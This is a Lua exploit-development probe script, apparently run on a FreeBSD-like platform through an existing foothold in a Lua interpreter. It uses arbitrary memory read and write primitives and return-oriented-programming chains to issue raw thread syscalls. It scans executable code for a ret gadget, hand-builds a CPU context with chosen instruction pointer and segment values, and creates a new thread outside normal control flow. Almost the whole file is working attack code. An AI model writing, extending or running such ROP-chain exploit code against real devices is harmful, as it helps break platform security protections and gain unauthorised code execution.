-- CRASH_CLASS: HIGH (may panic if CS=0x43 hypothesis is wrong)
-- PROBE 126c: thr_create via ropchain with proper syscall object
-- Creates a syscall object from syscall.pipe and changes syscall_no to 430

print("=== PROBE 126c: THR_CREATE FIXED ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

-- Section A: Inspect syscall.pipe to understand the object
print("")
print("--- SECTION A: SYSCALL.PIPE INSPECTION ---")
print("syscall.pipe type=" .. type(syscall.pipe))
if type(syscall.pipe) == "table" then
    for k, v in pairs(syscall.pipe) do
        print("  " .. tostring(k) .. "=" .. tostring(v) .. " (" .. type(v) .. ")")
    end
    local mt = getmetatable(syscall.pipe)
    if mt then
        print("  metatable:")
        for k, v in pairs(mt) do
            print("    mt." .. tostring(k) .. "=" .. type(v))
        end
    end
end

-- Check for fn_addr and syscall_no
print("  .fn_addr=" .. tostring(syscall.pipe.fn_addr))
print("  .syscall_no=" .. tostring(syscall.pipe.syscall_no))

-- Section B: Create thr_create syscall object
print("")
print("--- SECTION B: CREATE SYSCALL OBJECT ---")
local sc_thr_create = {}
for k, v in pairs(syscall.pipe) do sc_thr_create[k] = v end
sc_thr_create.syscall_no = 430
setmetatable(sc_thr_create, getmetatable(syscall.pipe))
print("sc_thr_create.fn_addr=" .. tostring(sc_thr_create.fn_addr))
print("sc_thr_create.syscall_no=" .. tostring(sc_thr_create.syscall_no))

-- Section C: Test with getpid first
print("")
print("--- SECTION C: ROPCHAIN GETPID TEST ---")
local ok_c, err_c = pcall(function()
    local sc_getpid = {}
    for k, v in pairs(syscall.pipe) do sc_getpid[k] = v end
    sc_getpid.syscall_no = 20
    setmetatable(sc_getpid, getmetatable(syscall.pipe))

    local chain = ropchain:new()
    chain:push_syscall_with_ret(sc_getpid)
    chain:restore_through_longjmp()
    chain:execute_through_coroutine()

    local ret = chain:get_last_retval_addr()
    print("retval_addr=" .. tostring(ret))
    if ret then
        local val = memory.read_qword(ret)
        print("getpid via ropchain=" .. tostring(val) .. " numeric=" .. to_num(val))
    end
end)
print("section C: ok=" .. tostring(ok_c) .. " err=" .. tostring(err_c))

-- Section D: thr_self to get main TID
print("")
print("--- SECTION D: THR_SELF ---")
local main_tid = 0
local ok_d, err_d = pcall(function()
    local sc_thr_self = {}
    for k, v in pairs(syscall.pipe) do sc_thr_self[k] = v end
    sc_thr_self.syscall_no = 432
    setmetatable(sc_thr_self, getmetatable(syscall.pipe))

    local tid_buf = memory.alloc(8)
    memory.write_qword(tid_buf, 0)

    local chain = ropchain:new()
    chain:push_syscall_with_ret(sc_thr_self, tid_buf)
    chain:restore_through_longjmp()
    chain:execute_through_coroutine()

    main_tid = to_num(memory.read_dword(tid_buf))
    print("main_tid=" .. main_tid)
end)
print("section D: ok=" .. tostring(ok_d) .. " err=" .. tostring(err_d))

-- Section E: CANARY before risky call
print("")
print("--- SECTION E: PRE-CANARY ---")
local canary_ok = pcall(function() return to_num(syscall.getpid()) end)
print("canary: " .. tostring(canary_ok))
if not canary_ok then
    print("ABORT")
    return
end

-- Section F: Build ucontext and call thr_create
print("")
print("--- SECTION F: THR_CREATE CS=0x43 ---")

-- Find ret gadget from gadgets table
local ret_gadget = nil
if gadgets then
    -- Try common names
    for _, name in ipairs({"ret", "stack_pivot"}) do
        if gadgets[name] then
            if name == "ret" then
                ret_gadget = gadgets[name]
                print("ret_gadget=" .. tostring(ret_gadget))
            end
        end
    end
    if not ret_gadget then
        -- Search all gadgets
        for k, v in pairs(gadgets) do
            if type(k) == "string" and k == "ret" then
                ret_gadget = v
            end
        end
    end
end

-- If still no ret gadget, scan eboot for 0xC3
if not ret_gadget then
    print("no ret gadget in table, scanning eboot...")
    -- eboot_addrofs contains real addresses in RX .text
    -- Any function address + some offset should have a ret
    -- Use first bytes of a known function
    local addr = eboot_addrofs.lua_pushinteger
    for off = 0, 0x100 do
        local ok, b = pcall(memory.read_byte, addr + off)
        if ok and to_num(b) == 0xC3 then
            ret_gadget = addr + off
            print("found ret at " .. tostring(ret_gadget))
            break
        end
    end
end

if not ret_gadget then
    print("NO RET GADGET - ABORT")
    return
end

-- Allocate thread stack
local thread_stack_size = 0x4000
local thread_stack = memory.alloc(thread_stack_size)
local thread_rsp = thread_stack + thread_stack_size - 0x100

-- Build ucontext
local ucontext = memory.alloc(0x400)
for off = 0, 0x3FC, 4 do memory.write_dword(ucontext + off, 0) end

local mc = ucontext + 0x10
memory.write_qword(mc + 0x88, ret_gadget)     -- mc_rip = ret gadget
memory.write_dword(mc + 0x90, 0x43)           -- mc_cs = USER_CS
memory.write_qword(mc + 0x98, uint64(0x202))  -- mc_rflags
memory.write_qword(mc + 0xA0, thread_rsp)     -- mc_rsp
memory.write_dword(mc + 0xA8, 0x3B)           -- mc_ss = USER_SS

print("ucontext: rip=" .. tostring(memory.read_qword(mc + 0x88)))
print("  cs=0x" .. string.format("%X", to_num(memory.read_dword(mc + 0x90))))
print("  ss=0x" .. string.format("%X", to_num(memory.read_dword(mc + 0xA8))))
print("  rsp=" .. tostring(memory.read_qword(mc + 0xA0)))

local new_tid_buf = memory.alloc(8)
memory.write_qword(new_tid_buf, 0)

print("")
print("*** CALLING thr_create(430) ***")

local ok_f, err_f = pcall(function()
    local chain = ropchain:new()
    chain:push_syscall_with_ret(sc_thr_create, ucontext, new_tid_buf, 0)
    chain:restore_through_longjmp()
    chain:execute_through_coroutine()

    local ret_addr = chain:get_last_retval_addr()
    if ret_addr then
        local ret_val = memory.read_qword(ret_addr)
        print("thr_create ret=" .. tostring(ret_val) .. " numeric=" .. to_num(ret_val))
    end
end)
print("thr_create: ok=" .. tostring(ok_f) .. " err=" .. tostring(err_f))

local new_tid = to_num(memory.read_qword(new_tid_buf))
print("new_tid=" .. new_tid)

-- Section G: Post canary
print("")
print("--- SECTION G: POST-CANARY ---")
local post_ok = pcall(function() return to_num(syscall.getpid()) end)
print("canary: " .. tostring(post_ok))

if post_ok and new_tid > 0 then
    print("")
    print("*** THREADING ALIVE! TID=" .. new_tid .. " ***")

    -- Brief sleep then check thread status
    sleep(0.05, 's')

    local ok_kill, err_kill = pcall(function()
        local sc_thr_kill = {}
        for k, v in pairs(syscall.pipe) do sc_thr_kill[k] = v end
        sc_thr_kill.syscall_no = 433
        setmetatable(sc_thr_kill, getmetatable(syscall.pipe))

        local chain = ropchain:new()
        chain:push_syscall_with_ret(sc_thr_kill, new_tid, 0)
        chain:restore_through_longjmp()
        chain:execute_through_coroutine()

        local ret_addr = chain:get_last_retval_addr()
        if ret_addr then
            local ret_val = to_num(memory.read_qword(ret_addr))
            print("thr_kill(tid,0)=" .. ret_val .. " (0=alive)")
        end
    end)
    print("thr_kill: ok=" .. tostring(ok_kill) .. " err=" .. tostring(err_kill))
end

print("=== PROBE 126c COMPLETE ===")
